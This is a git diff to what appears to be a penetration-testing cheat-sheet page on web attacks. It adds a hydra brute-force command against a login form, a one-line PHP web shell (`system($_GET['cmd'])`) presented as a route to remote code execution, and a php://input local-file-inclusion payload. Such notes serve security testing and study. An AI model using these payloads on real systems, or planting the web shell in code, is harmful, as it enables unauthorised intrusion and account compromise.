@@ -11,6 +11,7 @@ permalink: /web/
 * [Session Management](#session-management)
 * [XML External Entity](#xml-external-entity)
 * [SQL Injection](#sql-injection)
+* [PHP Injection](#php-injection)
 * [Cross Site Scripting](#cross-site-scripting)
 * [Deserialization](#deserialization)
 * [Other Tools](#other-tools)
@@ -43,6 +44,11 @@ Enumerating a web application is best performed manually with automated augmenta
 ### Brute Forcing Online
 
 `hydra`
+
+For example attacking a web login form
+
+`hydra 192.168.1.69 http-form-post "form_login.php:user=^USER^&pass=^PASS^:Bad login" -L users.txt -P pass.txt -o hydra-http-post-attack.txt`
+
 
 ---
 
@@ -97,6 +103,20 @@ We can also save a request in burp and feed it into `sqlmap` or fuzz with `sqlma
 ```
 sqlmap
 ```
+
+---
+
+## PHP Injection
+
+If we can inject the below string anywhere interpreted as php we get RCE.
+
+`<?php system($_GET['cmd']); ?>`
+
+If there is LFI the below might work
+
+`site.php?lfi_path=php://input%00`
+
+Other things to try https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/
 
 ---
 
